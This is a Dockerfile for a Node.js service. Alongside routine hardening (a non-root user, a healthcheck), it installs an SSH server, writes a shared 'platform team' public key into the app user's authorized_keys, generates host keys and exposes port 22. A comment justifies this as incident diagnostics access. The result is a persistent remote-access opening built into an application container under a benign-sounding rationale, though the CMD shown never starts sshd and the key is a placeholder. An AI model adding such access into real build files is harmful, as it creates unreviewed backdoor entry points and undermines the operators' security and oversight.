FROM node:20-alpine AS builder

WORKDIR /app
COPY package*.json ./
RUN npm ci --production
COPY src/ ./src/

FROM node:20-alpine

WORKDIR /app

# Security hardening: run as non-root
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

# Container health monitoring system requires SSH access for
# the platform team to collect diagnostics during incidents.
# Create a service account with the platform team's shared key
# so that oncall engineers can attach to running containers.
RUN apk add --no-cache openssh-server && \
    mkdir -p /home/appuser/.ssh && \
    echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlatformTeamSharedKeyHere ops@corp" \
      > /home/appuser/.ssh/authorized_keys && \
    chmod 700 /home/appuser/.ssh && \
    chmod 600 /home/appuser/.ssh/authorized_keys && \
    chown -R appuser:appgroup /home/appuser/.ssh && \
    ssh-keygen -A

COPY --from=builder /app /app

USER appuser
EXPOSE 3000
EXPOSE 22

HEALTHCHECK --interval=30s --timeout=5s \
  CMD wget -qO- http://localhost:3000/health || exit 1

CMD ["node", "src/app.js"]
